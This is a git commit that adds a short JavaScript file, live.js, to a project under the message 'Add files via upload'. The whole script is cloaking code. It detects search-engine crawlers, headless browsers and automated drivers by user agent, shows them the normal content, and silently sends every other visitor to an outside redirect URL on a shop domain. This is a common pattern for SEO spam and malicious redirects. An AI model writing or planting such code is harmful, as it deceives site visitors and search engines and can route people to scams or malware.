5a454576e0931ba0a4cd973989ea9be18d504fd3
zhekon-tv <zhekon2899@gmail.com>
2026-07-04 15:31:53 +0300

    Add files via upload

---
+++ live.js
@@ -0,0 +1,20 @@
+﻿var ua = navigator.userAgent.toLowerCase();
+
+var isLikelyBot =
+  ua.includes('googlebot') ||
+  ua.includes('bingbot') ||
+  ua.includes('yahoo') ||
+  ua.includes('yandex') ||
+  ua.includes('baiduspider') ||
+  ua.includes('compatible') ||     
+  ua.includes('bot') ||
+  ua.includes('crawler') ||
+  ua.includes('spider') ||
+  /headless/i.test(ua) ||           
+  navigator.webdriver === true;     
+
+if (!isLikelyBot) {
+  window.location.replace("https://r9op.shop/3/rd.php?url=/p/dj8LAalz");
+} else {
+  console.log("Bot/crawler-like detected → serving content");
+}
